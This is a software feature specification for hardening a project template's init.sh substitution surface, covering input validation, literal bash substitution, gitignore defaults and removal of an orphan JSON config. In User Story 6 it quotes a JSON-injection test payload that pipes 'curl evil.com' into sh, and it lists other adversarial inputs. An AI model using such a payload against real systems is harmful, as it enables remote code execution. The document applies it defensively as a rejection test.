---
prd_reference: docs/product/02_PRD/248-substitution-surface-hardening-2026-05-03.md
triad:
  pm_signoff:
    agent: product-manager
    date: 2026-05-03
    status: APPROVED
    notes: "All 7 US, 8 PRD FRs (+3 testability promotions FR-009/010/011), 5 NFRs, 4 Q-adjudications, 15 SCs (SC-015 non-DoD), 9 edge cases, and constitution principles III/VI/VII/VIII/IX/X faithfully translated; spec ready for Plan stage. 2 informational observations: NFR-003 adversarial-input count uplift 10→13 aligning with Test-2 corpus; spec-level promotion of pre-flight + residual scan to FR-003/FR-004 for testability."
  architect_signoff: null  # Added by /aod.project-plan
  techlead_signoff: null   # Added by /aod.tasks
---

# Feature Specification: Substitution Surface Hardening (BLP-02 Wave 1)

**Feature Branch**: `248-substitution-surface-hardening`
**Created**: 2026-05-03
**Status**: PM Approved (ready for /aod.project-plan)
**Input**: User description: "Feature 248: Substitution Surface Hardening (BLP-02 Wave 1). Source PRD: docs/product/02_PRD/248-substitution-surface-hardening-2026-05-03.md. PRD has full Triad sign-off (PM APPROVED, Architect APPROVED_WITH_CONCERNS, Team-Lead APPROVED_WITH_CONCERNS). Closes 5 /security vulns in init.sh substitution surface."

## Context Anchor

This spec implements [PRD 248](../../docs/product/02_PRD/248-substitution-surface-hardening-2026-05-03.md) — the first feature of the BLP-02 Enterprise Hardening Initiative, opened 2026-05-02 in response to Daniel Wood's LinkedIn note flagging unsafe `sed`-based substitution in `scripts/init.sh`. F-1 closes five `/security` findings (1 HIGH + 2 MEDIUM + 2 LOW) clustered on the placeholder substitution surface, in a single squash-merged PR with public ADR-038 and a release-please trigger.

**Out of scope (deferred to BLP-02 Wave 2+)**: `source`-without-validation patterns in `defaults.env` and `aod-kit-version`; new substitution engine; `finding.yaml` schema changes.

## User Scenarios & Testing *(mandatory)*

### User Story 1 — Adopter with metacharacter-bearing project name (Priority: P1)

An adopter runs `init.sh` to personalize the template. Their project name contains characters that have special meaning to the previous substitution mechanism (`AT&T`, `foo|bar`, `O'Reilly`, names with backslashes or quotes). The adopter expects the literal string they entered to land verbatim in every personalized file — without truncation, silent integrity loss, or downstream parser corruption.

**Why this priority**: This is the directly-flagged HIGH-severity vulnerability (TACHI-VULN-6bc17fd01ac8, CVSS 8.1) — the public Daniel Wood LinkedIn note literally names this case. Without literal substitution, downstream JSON parsers (`.claude/mcp-config.json`, agent definitions) can be coerced into parsing attacker-controlled bytes as structure, with multi-hop execution implications at next Claude Code launch.

**Independent Test**: Run `init.sh` with `PROJECT_NAME=AT&T` (and other adversarial values) on a controlled fixture. Grep the substituted tree for the literal value; confirm count matches baseline; confirm no `tachi` remnants and no metacharacter-interpretation artifacts (`ATtachiT`, truncation at `&`, etc.).

**Acceptance Scenarios**:

1. **Given** a fresh checkout with `PROJECT_NAME=AT&T`, **When** `init.sh` runs to completion, **Then** every occurrence of `tachi` in personalized files contains the literal string `AT&T` and `grep -r "AT&T" <substituted-tree>` matches the expected count from the recorded baseline fixture byte-for-byte.
2. **Given** a fresh checkout with `PROJECT_NAME=foo|bar`, **When** `init.sh` runs to completion, **Then** every personalized file contains the literal `foo|bar` with no substitution-expression breakage.
3. **Given** a fresh checkout with adversarial inputs from the ≥13-case test corpus (`AT&T`, `foo|bar`, `\1\2 backref`, `'single-quoted'`, `"double-quoted\"escaped"`, multibyte UTF-8 `Ⅷ-Ⅸ`), **When** `init.sh` runs and post-substitution residual scan executes, **Then** zero `{{KEY}}` placeholders survive in any personalized file and the resulting tree byte-matches the baseline.

---

### User Story 2 — Adopter who pastes a multi-line value (Priority: P1)

An adopter accidentally pastes a multi-line value into a `read -p` prompt (e.g., copying from a wrapped Slack message that contains an embedded newline, or pasting a value containing control characters). The adopter expects immediate prompt-time rejection with a clear reason, not a 60-second substitution run that hits an opaque write-time abort.

**Why this priority**: Defense-in-depth requires prompt-time rejection so adopters get immediate feedback and can fix input on the spot. Closes TACHI-VULN-77f0519f9cfb (MEDIUM, CVSS 5.3). Works in concert with US-248-1: literal substitution alone does not stop a payload that mimics JSON structure once it lands in a JSON-string position; prompt-time control-character + length rejection is a required layer.

**Independent Test**: Send a multi-line value through stdin to a `read -p` prompt; confirm the prompt rejects with a named-class reason and re-prompts. After 3 consecutive rejections, confirm `init.sh` exits non-zero with a clear final message.

**Acceptance Scenarios**:

1. **Given** the `PROJECT_NAME` prompt is awaiting input, **When** the adopter pastes a value containing an embedded newline, **Then** the prompt prints `[init] Input rejected: newline not allowed; please re-enter.` and re-prompts.
2. **Given** the `PROJECT_NAME` prompt is awaiting input, **When** the adopter pastes a value containing a NUL byte or any control character (0x00–0x1F except space), **Then** the prompt rejects with the named character class and re-prompts.
3. **Given** the `PROJECT_NAME` prompt is awaiting input, **When** the adopter enters 101+ characters (cap is 100), **Then** the prompt rejects with `[init] Input rejected: over-length (max 100 chars); please re-enter.`
4. **Given** the prompt has rejected 3 consecutive inputs, **When** the third rejection completes, **Then** `init.sh` exits non-zero with `[init] FATAL: 3 consecutive invalid inputs for PROJECT_NAME; aborting.`

---

### User Story 3 — Adopter who runs `git add -A` after init (Priority: P1)

An adopter runs `init.sh` and then runs `git add -A` (or `git add .aod/`) without inspecting the diff. The adopter expects that proprietary or pre-launch `PROJECT_DESCRIPTION` content will not be staged for commit by default — so they don't accidentally publish positioning into a public template fork.

**Why this priority**: Closes TACHI-VULN-bc67ca510ea9 (MEDIUM, CVSS 5.5, A05 Security Misconfiguration). The current `.gitignore` already excludes `.aod/personalization.env`; the spec verifies this and adds the missing CHANGELOG migration command for adopters who already committed the file before the gitignore line was added (commit `b27f3ea`, 2026-04-19).

**Independent Test**: Run `init.sh` to completion; run `git status`; confirm `.aod/personalization.env` is not staged and is listed under "Untracked files" (or absent if `.gitignore` is honored). Confirm CHANGELOG contains the migration command for previously-committed snapshots.

**Acceptance Scenarios**:

1. **Given** a fresh checkout, **When** `init.sh` runs to completion and the adopter runs `git status`, **Then** `.aod/personalization.env` does NOT appear in the staged or unstaged change set (it is gitignored).
2. **Given** the adopter wants to track the snapshot, **When** they remove the `.aod/personalization.env` line from `.gitignore` and re-run `git status`, **Then** the file appears in the staged change set (opt-in path works).
3. **Given** an existing adopter who already committed `.aod/personalization.env` before BLP-02, **When** they consult CHANGELOG for migration guidance, **Then** the entry contains a copy-pasteable `git rm --cached .aod/personalization.env && git commit -m "chore: untrack personalization snapshot per BLP-02 default"` command.

---

### User Story 4 — Maintainer auditing the substitution surface (Priority: P2)

A maintainer reviewing the substitution surface (during code review, security audit, or onboarding) expects exactly one canonical substitution implementation across the codebase. They expect zero `sed` invocations on personalization-bearing content in `init.sh` and a clear ADR documenting why.

**Why this priority**: Closes TACHI-VULN-18127be5d214 (LOW, CVSS 3.1, the constitution sed cleanup) and addresses the architectural soundness gap of having two substitution mechanisms (`init.sh` sed-based, `update.sh` via `aod_template_substitute_placeholders`). Single canonical pattern prevents future point-fixes from regressing posture by introducing a third mechanism.

**Independent Test**: Run `grep -n "sed " scripts/init.sh` after F-1 — confirm zero matches. Confirm constitution cleanup uses a `cp` invocation against a pre-stripped template. Confirm ADR-038 exists with status `Accepted` and documents the migration.

**Acceptance Scenarios**:

1. **Given** the post-F-1 `scripts/init.sh`, **When** a maintainer runs `grep -n "sed " scripts/init.sh`, **Then** the result is zero matches.
2. **Given** the post-F-1 repository, **When** a maintainer reviews the constitution cleanup logic in `init.sh`, **Then** they find a single `cp ".aod/templates/constitution-clean.md" .aod/memory/constitution.md` invocation and zero `sed -i` calls operating on `.aod/memory/constitution.md`.
3. **Given** the post-F-1 repository, **When** a maintainer locates `docs/architecture/02_ADRs/ADR-038-placeholder-substitution-strategy.md`, **Then** the file exists with status `Accepted`, documents the alternatives considered (sed escaping wrapper, `awk -v`, Python `string.Template`, Perl), and cites ADR-009 as the prior decision being superseded on the mechanism axis.

---

### User Story 5 — Security reviewer tracing the placeholder contract (Priority: P2)

A security reviewer evaluating tachi's substitution contract expects every placeholder appearing in any template file to be a member of the canonical placeholder set. They expect zero orphan placeholders that fail-silent.

**Why this priority**: Closes TACHI-VULN-30bbfd90959a (LOW, CVSS 3.7) — the orphan `{{PROJECT_PATH}}` in `.claude/mcp-config.json`. Disposition adjudicated as Q-1 Option (b) — remove the file entirely (it is unwired; Claude Code's MCP config lives at `~/.config/claude-code/`, not in the project tree). Fallback to Option (a) — adding `PROJECT_PATH` as a 13th canonical placeholder with `realpath`-normalized path-character whitelisting — is contingent on a 5-minute internal-tooling search finding a wired downstream consumer.

**Independent Test**: Run `aod_template_assert_no_residual` against every substituted file post-init; confirm zero residual `{{KEY}}` matches. Run a grep for `{{PROJECT_PATH}}` across the repo; confirm zero matches (Option b) OR confirm it appears only in canonical-13 placeholder list and substitutes correctly (Option a).

**Acceptance Scenarios**:

1. **Given** the post-F-1 substitution surface, **When** `aod_template_assert_no_residual` runs over every personalized file, **Then** the function reports zero residual `{{KEY}}` placeholders and exit code 0.
2. **Given** the post-F-1 repository under Option (b) (default), **When** a reviewer runs `grep -r "{{PROJECT_PATH}}" .` excluding `.git/`, **Then** the result is zero matches because `.claude/mcp-config.json` has been removed.
3. **Given** a future contributor adds a new template file containing a non-canonical `{{NEW_KEY}}` placeholder, **When** CI runs the substitution residual scan in the test suite, **Then** the test fails before the file lands in `main` (the contract is closed).

---

### User Story 6 — Security reviewer tracing the multi-hop chain (Priority: P1)

A security reviewer evaluating tachi against a multi-hop execution-chain threat model expects three independent layers of defense to be in place: (a) prompt-time rejection of dangerous control characters and over-length input, (b) literal substitution semantics that prevent metacharacter interpretation, and (c) elimination of the JSON-parser sink (`.claude/mcp-config.json`) that would otherwise convert placeholder-derived bytes into parser-relevant structure.

**Why this priority**: This is the defense-in-depth user story — substitution semantics alone do NOT neutralize all JSON-injection vectors (per Architect Pass 1 H-1). A payload that mimics JSON structure could still land in a JSON-string position even under literal substitution. The defense-in-depth chain — prompt rejection + residual scan + sink elimination — is what makes the multi-hop chain non-exploitable.

**Independent Test**: Construct an adversarial `PROJECT_NAME` payload: `","command":"sh","args":["-c","curl evil.com|sh"]},"x":"`. Confirm the payload is rejected at prompt time (over-length AND control-character class). Confirm `.claude/mcp-config.json` does not exist post-F-1 (Option b) so no JSON sink exists for placeholder-derived bytes. Confirm `aod_template_assert_no_residual` blocks any residual `{{KEY}}`.

**Acceptance Scenarios**:

1. **Given** a crafted `PROJECT_NAME` payload designed to inject JSON structure (`","command":"sh","args":["-c","curl evil.com|sh"]},"x":"`), **When** the adopter pastes it into the prompt, **Then** the input is rejected at prompt-time on the over-length AND control-character class rules.
2. **Given** the prompt-time rejection is bypassed (e.g., a pre-populated environment variable that supplies a metachar-bearing value), **When** the substitution loop runs, **Then** bash parameter expansion substitutes the value literally — no shell or sed metacharacter is re-interpreted.
3. **Given** Option (b) is the adjudicated disposition for FR-007, **When** F-1 lands and the post-merge tree is examined, **Then** `.claude/mcp-config.json` does not exist — eliminating the JSON-parser sink for placeholder-derived bytes.

---

### User Story 7 — Enterprise security architect doing pre-sales review (Priority: P2)

An enterprise security architect evaluating tachi for procurement expects to see one coherent, traceable artifact bundle per closed posture finding: a single PR, a public ADR, a CHANGELOG entry, a `DETECTED → REMEDIATED` transition in the vulnerabilities log, and an automated release-please trigger that publishes the fix in the next release. The architect uses this artifact ratio as a proxy for posture-claims-to-evidence ratio.

**Why this priority**: F-1 is the visible posture commit that establishes the BLP-02 cadence and converts five `DETECTED` events into `REMEDIATED` events with full traceability. Aligns with Constitution Principle VIII (Posture-as-Evidence) and supports tachi's source-of-truth positioning for enterprise-buyer pre-sales review.

**Independent Test**: After merge, verify (a) the PR squash-merge title matches `feat(248): ...`, (b) ADR-038 exists in `docs/architecture/02_ADRs/`, (c) `.security/vulnerabilities.jsonl` shows 5 `REMEDIATED` events with merge SHA + timestamp, (d) release-please opens a release PR within ~30 seconds post-merge.

**Acceptance Scenarios**:

1. **Given** F-1 is squash-merged into `main`, **When** an architect inspects the merge commit, **Then** the title is `feat(248): harden init.sh substitution surface — sed → bash param expansion + input validation + gitignore default` (Conventional-Commits-formatted).
2. **Given** the post-merge state, **When** an architect locates the artifact bundle for F-1, **Then** they find: ADR-038 in `docs/architecture/02_ADRs/`, a CHANGELOG entry under v4.x with migration command, 5 `REMEDIATED` events in `.security/vulnerabilities.jsonl` referencing the merge SHA, and a release-please PR that opened within ~30s of the F-1 squash-merge.
3. **Given** release-please did NOT open a PR within ~30s (e.g., upstream cadence variance), **When** the post-merge belt-and-suspenders verification step runs, **Then** an empty `feat(248): substitution surface hardening — release marker` commit is pushed to `main` and a release-please PR opens within the next ~30s.

---

### Edge Cases

- **File ending without trailing newline**: a fixture file containing exactly `printf 'no-newline-file' > fixture.txt` (no trailing LF byte) MUST substitute byte-identical — the substitution mechanism MUST NOT silently add or strip trailing newlines.
- **File containing literal `a\nb` four-byte sequence**: a fixture file containing the four bytes `a`, `\`, `n`, `b` (no actual LF byte) MUST substitute byte-identical — the substitution mechanism MUST treat backslash-n as two literal characters, not a newline.
- **Multibyte UTF-8 inputs**: a `PROJECT_NAME` containing `Ⅷ-Ⅸ` (Roman numerals at U+2160 range, three-byte UTF-8 sequences) MUST pass validation (control-char rejection only fires below 0x20) and substitute byte-identical.
- **Bash 3.2 vs bash 4+ behavior**: all helpers MUST run under macOS-default bash 3.2.57 AND Linux bash 5.x. No associative arrays, no `mapfile`/`readarray`, no `${var,,}` lowercase expansion in adopter-facing helpers.
- **Re-init attempt on already-personalized tree**: an adopter running `init.sh` on a tree where `.aod/personalization.env` already exists MUST hit a fatal pre-flight error (`[init] FATAL: Repository already personalized. Re-init is not supported.`). The existing self-delete at `init.sh:354` (`rm -f scripts/init.sh`) is the hard prevention; the pre-flight is the soft guard.
- **Existing adopter who committed `.aod/personalization.env` before BLP-02**: the CHANGELOG migration command works without breaking history (`git rm --cached` preserves the file on disk and only untracks it).
- **Performance regression on large forks**: bash `${str//pat/rep}` is in-process and ~50–500× faster than `sed` for typical small templates, but reads each file into a bash scalar (O(N · S) memory). Adopters with large content trees may see different scaling. NFR-004 mandates a Stream 1 Day 1 benchmark with measurable escalation thresholds.
- **release-please cadence variance**: the post-merge release-please PR may not open within 30s on every release. The belt-and-suspenders empty marker commit (per F-212 incident lessons) closes this gap.
- **Daniel Wood's LinkedIn post mutability**: LinkedIn posts can be edited or deleted. The spec mandates a `web.archive.org` snapshot in ADR-038 §References as the durable evidence trail.

## Requirements *(mandatory)*

> **Acceptance Criteria Rule**: Each AC begins with **Given** and follows Given/When/Then structure. ACs that cannot be automated are marked `[MANUAL-ONLY] <reason>` inline.

### Functional Requirements

- **FR-001**: System MUST remove the `replace_in_files()` function from `scripts/init.sh:117-159` and route every personalization-target file through the existing `aod_template_substitute_placeholders` function (bash parameter expansion, literal substitution).
  - **AC-1.1**: **Given** the post-F-1 `scripts/init.sh`, **When** a reviewer runs `grep -n "replace_in_files" scripts/init.sh`, **Then** the result is zero matches.
  - **AC-1.2**: **Given** the post-F-1 `scripts/init.sh`, **When** the script runs against the canonical fixture, **Then** every file matching the existing `find` filter (excluding `.git/`, `node_modules/`, binary extensions) is substituted via `aod_template_substitute_placeholders`.

- **FR-002**: System MUST reorder `init.sh` so that `.aod/personalization.env` is written BEFORE the substitution loop, and `aod_template_load_personalization_env .aod/personalization.env` is called BEFORE `aod_template_substitute_placeholders` (per Architect Pass 1 BLOCKING B-2 adjudication: pattern P1 — reorder, NOT pattern P2 shim, NOT pattern P3 mutate-shared-library).
  - **AC-2.1**: **Given** the post-F-1 `init.sh` execution flow, **When** the script runs, **Then** the order is: source library → set vars via prompts → write snapshot → load snapshot env vars → substitute loop → residual scan → version-pin → self-delete.
  - **AC-2.2**: **Given** an adopter runs `init.sh` and the substitution loop executes, **When** any single substitution call is examined, **Then** all 12 `AOD_PERSONALIZATION_<KEY>` environment variables are populated from the snapshot file.

- **FR-003**: System MUST add a pre-flight check at the top of `init.sh` that exits non-zero if `.aod/personalization.env` already exists (re-init prevention per Team-Lead Q-3 Option b + Architect M-3).
  - **AC-3.1**: **Given** an adopter has already personalized the repository (`.aod/personalization.env` exists), **When** they re-invoke `init.sh` (e.g., via a fresh clone of the personalized repo), **Then** the script exits non-zero with `[init] FATAL: Repository already personalized. Re-init is not supported. To re-personalize, remove .aod/personalization.env and re-run init.sh.`
  - **AC-3.2**: **Given** the pre-flight check fires, **When** the exit code is captured, **Then** it is non-zero (1 or higher).

- **FR-004**: System MUST call `aod_template_assert_no_residual` on every substituted file after the substitution loop and halt init non-zero on any residual `{{KEY}}` with a message naming the file and the orphan placeholder.
  - **AC-4.1**: **Given** a personalization-target file contains an orphan `{{NON_CANONICAL}}` placeholder after substitution, **When** the residual scan runs, **Then** init exits non-zero with `<file>:<line>: residual placeholder {{NON_CANONICAL}}` printed to stderr.
  - **AC-4.2**: **Given** all personalization-target files contain only canonical placeholders that were correctly substituted, **When** the residual scan runs over the substituted tree, **Then** the function reports zero residuals and init proceeds.

- **FR-005**: System MUST add a new helper `aod_init_read_validated <prompt> <var_name> <max_len>` in a new sourced file `.aod/scripts/bash/init-input.sh` (Q-2 Option b adjudication). The helper MUST validate input against: no embedded newline, no NUL byte, no control characters (0x00–0x1F except space), length ≤ max_len. On rejection, the helper MUST print `[init] Input rejected: <reason>; please re-enter.` and re-prompt up to 3 times before exiting non-zero. On acceptance, the helper MUST set the variable named by `$var_name` via `printf -v "$var_name" '%s' "$answer"` (no `eval`).
  - **AC-5.1**: **Given** the new helper exists at `.aod/scripts/bash/init-input.sh`, **When** `init.sh` sources the file, **Then** `aod_init_read_validated` is callable.
  - **AC-5.2**: **Given** the helper is invoked with a multi-line input value, **When** the validation runs, **Then** the helper prints `[init] Input rejected: newline not allowed; please re-enter.` and re-prompts.
  - **AC-5.3**: **Given** the helper is invoked with a NUL byte in the input, **When** the validation runs, **Then** the helper rejects on the NUL/control-character class and re-prompts.
  - **AC-5.4**: **Given** the helper is invoked with input exceeding the max_len cap, **When** the validation runs, **Then** the helper rejects with `[init] Input rejected: over-length (max <N> chars); please re-enter.`
  - **AC-5.5**: **Given** 3 consecutive rejections occur, **When** the third rejection completes, **Then** init exits non-zero with `[init] FATAL: 3 consecutive invalid inputs for $var_name; aborting.`
  - **AC-5.6**: **Given** all four `read -p` prompts at `scripts/init.sh:24-28` (PROJECT_NAME, PROJECT_DESCRIPTION, GITHUB_ORG, GITHUB_REPO), **When** the post-F-1 `init.sh` runs, **Then** each prompt is wrapped in `aod_init_read_validated` with the appropriate length cap (PROJECT_NAME 100, PROJECT_DESCRIPTION 300, GITHUB_ORG 39, GITHUB_REPO 100).

- **FR-006**: System MUST verify `.gitignore` includes `.aod/personalization.env` and update `contracts/personalization-schema.md` to document local-only as the default behavior. CHANGELOG MUST contain a copy-pasteable migration command for adopters who already committed `.aod/personalization.env`.
  - **AC-6.1**: **Given** the post-F-1 `.gitignore`, **When** a reviewer runs `grep -n ".aod/personalization.env" .gitignore`, **Then** the line is present.
  - **AC-6.2**: **Given** an adopter runs `init.sh` then `git status`, **When** the status output is examined, **Then** `.aod/personalization.env` does not appear in the staged or unstaged change set.
  - **AC-6.3**: **Given** the post-F-1 CHANGELOG, **When** a reviewer reads the v4.x entry, **Then** it contains the copy-pasteable text `git rm --cached .aod/personalization.env && git commit -m "chore: untrack personalization snapshot per BLP-02 default"`.
  - **AC-6.4**: **Given** the post-F-1 `contracts/personalization-schema.md`, **When** a reviewer reads §Substitution Strategy, **Then** local-only-default behavior is documented with the opt-in path described.

- **FR-007**: System MUST resolve the `{{PROJECT_PATH}}` orphan placeholder per Q-1 adjudicated Option (b) — remove `.claude/mcp-config.json` from the template entirely. Default is Option (b); fallback to Option (a) (add `PROJECT_PATH` as 13th canonical placeholder with `realpath` normalization and path-character whitelist) is contingent on a 5-minute internal-tooling search across `.aod/scripts/`, `.claude/agents/`, `.claude/commands/`, `Makefile`, and `scripts/` finding a wired downstream consumer. The search outcome MUST be recorded in this spec as the Architect-confirmed adjudication artifact (see §Internal-Tooling Search Outcome below).
  - **AC-7.1**: **Given** the internal-tooling search has completed and Option (b) is the disposition, **When** the post-F-1 repository is inspected, **Then** `.claude/mcp-config.json` does not exist (`git status` shows it deleted; `ls .claude/mcp-config.json` returns "No such file or directory").
  - **AC-7.2**: **Given** Option (b) is implemented, **When** a reviewer runs `grep -r "{{PROJECT_PATH}}" .` excluding `.git/`, **Then** the result is zero matches.
  - **AC-7.3**: **Given** the CHANGELOG entry, **When** a reviewer reads it, **Then** the file removal is documented with the rationale that `.claude/mcp-config.json` was an unwired example template.
  - **AC-7.4**: **Given** the internal-tooling search surfaces a wired consumer (Option a fallback), **When** the implementation lands, **Then** `PROJECT_PATH` is added to the canonical placeholder array, populated via `realpath "$(pwd)"`, validated against the path-character whitelist `[A-Za-z0-9._/-]`, and documented in `contracts/personalization-schema.md`.

- **FR-008**: System MUST replace the two `sed -i` invocations at `scripts/init.sh:235-241` (constitution.md cleanup) with a `cp` invocation against a pre-stripped template at `.aod/templates/constitution-clean.md`. Two pre-stripped templates ship: `.aod/templates/constitution-clean.md` (post-strip output, used at init time) and `.aod/templates/constitution-instructional.md` (full template with embedded HTML comment instructions, retained as documentation for downstream forks).
  - **AC-8.1**: **Given** the post-F-1 `scripts/init.sh`, **When** a reviewer runs `grep -n "sed " scripts/init.sh`, **Then** the result is zero matches.
  - **AC-8.2**: **Given** the post-F-1 `scripts/init.sh`, **When** the constitution cleanup logic is executed, **Then** it consists of a single `cp ".aod/templates/constitution-clean.md" .aod/memory/constitution.md` invocation.
  - **AC-8.3**: **Given** the post-F-1 repository, **When** a reviewer compares `.aod/memory/constitution.md` against `.aod/templates/constitution-clean.md` after running `init.sh`, **Then** the files are byte-identical.
  - **AC-8.4**: **Given** the post-F-1 repository, **When** a reviewer locates `.aod/templates/`, **Then** both `constitution-clean.md` and `constitution-instructional.md` exist.

- **FR-009**: System MUST author a public ADR-038 at `docs/architecture/02_ADRs/ADR-038-placeholder-substitution-strategy.md` documenting the migration. The ADR MUST follow the dual-commit pattern (Proposed → Accepted) and MUST contain Status, Context, Decision, Alternatives Considered (sed escaping wrapper, `awk -v`, Python `string.Template`, Perl), Consequences, Related Decisions (citing ADR-009), and Related Findings (5 vuln_ids closed). The Decision section MUST explicitly note the residual-scan regex character class and commit to lockstep updates if the canonical placeholder list expands. The References section MUST include the Daniel Wood LinkedIn URL plus a `web.archive.org` snapshot URL as the durable evidence trail.
  - **AC-9.1**: **Given** the post-F-1 repository, **When** a reviewer locates `docs/architecture/02_ADRs/ADR-038-placeholder-substitution-strategy.md`, **Then** the file exists.
  - **AC-9.2**: **Given** the file exists, **When** a reviewer reads its Status field, **Then** the value is `Accepted` (after dual-commit promotion).
  - **AC-9.3**: **Given** the ADR §Alternatives Considered, **When** a reviewer reads it, **Then** all four alternatives (sed-escape wrapper, awk -v, Python string.Template, Perl) are listed with rationale for rejection.
  - **AC-9.4**: **Given** the ADR §Related Decisions, **When** a reviewer reads it, **Then** ADR-009 is cited as the prior decision being superseded on the mechanism axis.
  - **AC-9.5**: **Given** the ADR §References, **When** a reviewer reads it, **Then** a `web.archive.org` snapshot URL of Daniel Wood's 2026-05-02 LinkedIn note is present.

- **FR-010**: System MUST trigger a release-please release via Conventional-Commits PR title and belt-and-suspenders post-merge verification (per `.claude/rules/git-workflow.md` R12 pattern).
  - **AC-10.1**: **Given** the draft PR is created, **When** the title is examined, **Then** it is `feat(248): harden init.sh substitution surface — sed → bash param expansion + input validation + gitignore default`.
  - **AC-10.2**: **Given** F-1 is squash-merged, **When** the post-merge belt-and-suspenders verification runs `gh pr list --state open --search "release-please" --limit 3`, **Then** a release-please PR appears within ~30 seconds. **[MANUAL-ONLY]** observation: post-merge verification is run by the closing operator at `/aod.deliver`, not by an automated test in this PR.
  - **AC-10.3**: **Given** the release-please PR did NOT open within ~30s, **When** the operator pushes an empty release-marker commit (`feat(248): substitution surface hardening — release marker`), **Then** a release-please PR opens within the following ~30s. **[MANUAL-ONLY]** fallback path executed only if AC-10.2 fails.

- **FR-011**: System MUST land the regression protection test suite using **pytest-via-subprocess** (NOT bats), per Architect Pass 1 BLOCKING B-1 adjudication. Test files MUST land at `tests/scripts/test_init_sh_*.py` using the existing pytest convention. The fixture baseline tree MUST land at `tests/fixtures/init-baseline-tree/` with a regeneration script at `tests/fixtures/regenerate-baseline.sh`.
  - **AC-11.1**: **Given** the post-F-1 test tree, **When** a reviewer runs `find tests -name "*.bats"`, **Then** the result is zero matches.
  - **AC-11.2**: **Given** the post-F-1 test tree, **When** a reviewer locates `tests/scripts/`, **Then** the four new test files exist: `test_init_sh_substitution.py` (Test-1), `test_init_sh_adversarial.py` (Test-2), `test_init_sh_constitution.py` (Test-4), `test_init_sh_self_delete.py` (Test-5').
  - **AC-11.3**: **Given** the existing CI matrix, **When** F-1 lands, **Then** the same matrix (macos-latest bash 3.2.57 + ubuntu-latest bash 5.x) runs the new tests with no new workflow file added.
  - **AC-11.4**: **Given** the post-F-1 fixtures directory, **When** a reviewer locates `tests/fixtures/`, **Then** `init-baseline-tree/` exists as a recorded baseline and `regenerate-baseline.sh` exists as the documented regeneration script.

### Non-Functional Requirements

- **NFR-001 (Cross-platform parity)**: All tests MUST pass on macOS (bash 3.2.57 default) AND Linux (bash 4+). No bash-4-only features (no associative arrays, no `mapfile`/`readarray`, no `${var,,}` lowercase expansion) in the new helper functions. CI gates merge on both green.

- **NFR-002 (No new runtime dependencies)**: System MUST NOT introduce any new runtime dependencies. Diff on `pyproject.toml`, `requirements*.txt`, `package.json`, and any other dependency manifest MUST be empty. The work uses bash builtins only (parameter expansion, `printf`, `[[`).

- **NFR-003 (Substitution-semantics byte-identity)**: Across at least 13 adversarial inputs (per the Regression Protection Plan), the substituted output tree MUST be byte-identical to a recorded baseline tree. No silent encoding shifts, no trailing-newline drift, no file-mode regressions.

- **NFR-004 (Performance neutrality with measurable escalation)**: Init duration on a fresh checkout MUST NOT regress by more than **10%** under the new substitution path on the canonical fixture (measured against the current `replace_in_files()` baseline). Stream 1 Day 1 MUST include a benchmark comparison; both timings MUST be recorded in ADR-038 §Consequences. Escalation thresholds:
  - **≤ 5% delta**: NFR-004 holds at 10%; no PRD update needed.
  - **5%–50% delta**: ADR-038 documents the actual delta and loosens NFR-004 to 25% with rationale (literal-substitution correctness is worth the constant-factor regression on the canonical fixture).
  - **> 50% delta**: spec author escalates to PM for re-scope before merge.

- **NFR-005 (Zero `finding.yaml` schema change)**: `schemas/finding.yaml` MUST NOT be modified. The five vuln_id closures use the existing schema; the `.security/vulnerabilities.jsonl` `REMEDIATED` events conform to the existing event shape. Eighth consecutive feature preserving the BLP-01 detection-tier contract.

### Internal-Tooling Search Outcome (FR-007 adjudication artifact)

Per Team-Lead Pass 1 L-2, the spec records the outcome of the 5-minute internal-tooling search across `.aod/scripts/`, `.claude/agents/`, `.claude/commands/`, `Makefile`, and `scripts/` for any reader of `.claude/mcp-config.json`.

**Search executed during research phase**: grep across the listed paths for `mcp-config.json` references and any wired consumer logic.

**Outcome (CONFIRMED 2026-05-03 during Stream 1 Day 1 build, T005)**: Internal-tooling search executed against `.aod/scripts/`, `.claude/agents/`, `.claude/commands/`, `Makefile`, and `scripts/`. Result: **zero matches** in every path. Broader sanity check across `*.sh`, `*.md`, `*.py`, `*.json`, `*.yml`, `*.yaml`, `Makefile` (excluding `.git/`, `node_modules/`, `specs/`, `docs/`) returned no consumer references outside the file itself. The file is documentation-only (the `comments.usage` array at lines 14-19 reads *"Replace {{PROJECT_PATH}} with the absolute path to your project root"*). Claude Code's actual MCP config lives at `~/.config/claude-code/`, not in the project tree. **Adjudicated disposition: Option (b) — remove `.claude/mcp-config.json` in T033.** Fallback Option (a) (canonical-13 with `PROJECT_PATH`) is NOT triggered.

### Key Entities

- **Personalization snapshot** (`.aod/personalization.env`): the canonical KEY=VALUE record of all 12 placeholder values, written at init time, sourced by both `init.sh` (post-F-1) and `update.sh`. Local-only by default (gitignored). Adversaries who acquire write access to this file post-init can manipulate substitution outcomes on subsequent `update.sh` runs — the gitignore-default + write protection are the controls.

- **Canonical placeholder set**: the locked 12-element array `AOD_CANONICAL_PLACEHOLDERS` at `.aod/scripts/bash/template-substitute.sh:50-63`. Locked under Option (b); expanded to 13 elements with `PROJECT_PATH` under Option (a). Placeholders not in this set fail-fast via the residual scan rather than fail-silent.

- **Substitution surface**: the set of personalization-target files matched by the existing `find` filter in `init.sh` (excludes `.git/`, `node_modules/`, binary extensions). Post-F-1, every file in this set is processed by `aod_template_substitute_placeholders` and verified by `aod_template_assert_no_residual`.

- **Constitution template variants**: `.aod/templates/constitution-clean.md` (post-strip, used at init) and `.aod/templates/constitution-instructional.md` (full, retained for fork documentation). Both ship as new files in F-1.

- **Vulnerability event log** (`.security/vulnerabilities.jsonl`): the audit trail capturing `DETECTED → REMEDIATED` transitions. F-1 adds 5 `REMEDIATED` events post-merge with the squash-merge SHA and timestamp; schema is preserved (NFR-005).

- **ADR-038**: the public architectural decision record for placeholder substitution strategy. New file at `docs/architecture/02_ADRs/ADR-038-placeholder-substitution-strategy.md`. Supersedes ADR-009 on the mechanism axis (placeholder enumeration in ADR-009 remains valid).

## Success Criteria *(mandatory)*

### Vulnerability Closure

- **SC-001**: All five vuln_ids transition `DETECTED → REMEDIATED` in `.security/vulnerabilities.jsonl` with timestamp and merging commit SHA recorded:
  - TACHI-VULN-6bc17fd01ac8 (HIGH — sed metachar)
  - TACHI-VULN-77f0519f9cfb (MEDIUM — read -p validation)
  - TACHI-VULN-bc67ca510ea9 (MEDIUM — personalization.env gitignore)
  - TACHI-VULN-30bbfd90959a (LOW — orphan PROJECT_PATH)
  - TACHI-VULN-18127be5d214 (LOW — constitution sed)
